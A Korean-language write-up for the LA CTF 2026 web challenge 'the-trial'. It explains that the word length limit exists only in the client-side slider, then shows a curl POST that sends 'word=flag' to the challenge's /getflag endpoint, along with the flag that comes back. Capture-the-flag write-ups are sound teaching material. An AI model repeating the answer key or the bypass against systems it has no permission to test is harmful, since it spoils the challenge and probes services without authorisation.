# the-trial (LA CTF 2026)

---

- **Name:** the-trial
- **Category:** Web
- **Connection:** `https://the-trial.chall.lac.tf`
- **Flag format:** `lactf{...}`

---

### 개요

슬라이더 4개로 글자를 하나씩 고르면,
4글자짜리 단어(word)가 만들어지고 서버로 전송됩니다.

문제는 어떤 단어를 보내야 플래그가 나오는지,
그리고 슬라이더 UI를 거치지 않고 직접 요청을 보낼 수 있는지입니다.

---

### 소스 분석

#### 프론트엔드 JS — 요청 형식 확인

브라우저 DevTools에서 소스를 열어보면 요청을 보내는 부분이 그대로 노출되어 있습니다.

```js
fetch("/getflag", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "word=" + currentWord
})
```

요청 형식이 완전히 공개되어 있습니다.
UI를 쓸 필요 없이 원하는 `word` 값을 직접 보낼 수 있습니다.

#### 서버 사이드 — 제약 없음

슬라이더는 4글자까지만 조합할 수 있지만, 이건 **UI에만 존재하는 제약**입니다.
서버는 넘어온 `word` 값만 검사할 뿐, 길이나 형식을 따로 검증하지 않습니다.

클라이언트 사이드 제약은 신뢰할 수 없습니다.
직접 요청을 보내면 슬라이더가 만들 수 없는 단어도 전달할 수 있습니다.

---

### 취약점 분석

서버가 기대하는 값이 무엇인지만 알면 됩니다.
문제 이름이 `the-trial`이고, flag를 반환하는 엔드포인트가 `/getflag`라면,
`word=flag`를 보내는 것이 가장 먼저 시도해볼 값입니다.

---

### Exploit 실행 과정

UI를 건너뛰고 `word=flag`를 직접 POST합니다.

```bash
curl -s -X POST "https://the-trial.chall.lac.tf/getflag" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "word=flag"
```

실행 결과:

```
lactf{gregor_samsa_awoke_from_wait_thats_the_wrong_book}
```
